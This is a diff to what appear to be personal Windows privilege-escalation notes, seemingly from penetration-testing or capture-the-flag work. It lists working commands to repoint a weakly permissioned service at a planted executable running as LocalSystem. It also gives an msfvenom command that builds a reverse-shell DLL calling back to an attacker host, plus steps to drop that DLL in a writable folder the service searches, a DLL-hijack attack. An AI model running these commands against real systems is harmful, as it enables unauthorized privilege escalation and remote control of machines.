@@ -41,6 +41,7 @@ sc.exe start <Service>
 ## Weak service permissions: point it at mine
 The space after each = matters: binpath="..." silently fails.
 sc.exe config <Service> binpath= "C:\Users\Public\svc.exe"
+When it runs as another account, from cmd.exe, since PowerShell drops the empty password:
 sc.exe config <Service> obj= ".\LocalSystem" password= ""
 sc.exe stop <Service>
 sc.exe start <Service>
@@ -55,6 +56,9 @@ net start <Service>
 ## A DLL it loads from a folder I can write
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o <File>
 - [ ] The DLL's name from Process Monitor on my own Windows: NAME NOT FOUND, path ending .dll
+- [ ] THE-FOLDER is the writable folder it searches, from icacls
+Fetched with the line serve files gives, then:
+copy C:\Users\Public\<File> "THE-FOLDER\<File>"
 sc.exe stop <Service>
 sc.exe start <Service>
 
